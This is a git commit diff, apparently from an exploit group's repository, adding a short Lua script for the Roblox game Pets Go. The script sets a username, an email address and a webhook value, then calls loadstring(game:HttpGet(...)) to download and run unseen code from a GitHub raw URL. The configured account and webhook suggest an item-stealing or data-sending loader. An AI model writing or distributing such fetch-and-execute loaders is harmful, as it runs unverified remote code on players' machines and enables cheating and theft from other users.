de75f5d0bc45d3ea9a3791b61e4c687942cb5cae
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-19 09:53:21 +0200

    Add generated script

---
+++ pets go/MyBot.lua
@@ -0,0 +1,5 @@
+Username = "s25088@sgc.ac.zw"
+Username2 = "jrthergwef"
+Webhook = "ktyjrthergw"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20pets%20go"))()
